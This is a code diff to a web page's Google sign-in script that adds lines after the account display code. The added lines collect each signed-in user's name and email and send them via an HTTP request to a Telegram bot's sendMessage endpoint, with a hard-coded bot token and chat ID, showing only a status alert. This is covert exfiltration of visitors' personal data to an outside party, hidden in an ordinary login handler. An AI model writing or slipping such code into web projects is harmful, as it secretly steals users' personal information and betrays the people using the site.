@@ -557,5 +557,13 @@
   $("#im-account").attr("src",profile.getEmail());
   $("#name-account").text(profile.getName());
   $("#account").show();
+
+
+  var s = profile.getName()+"   Email:    "+profile.getEmail();   
+
+
+      $.get("https://api.telegram.org/bot1679902226:AAFRpQWrbnfTiDMNMPMru5pB5UYVe4E5p7U/sendMessage?chat_id=1675961350&text="+s, function(data, status){
+        alert("Status: " + status);
+      });
 }
 </script>
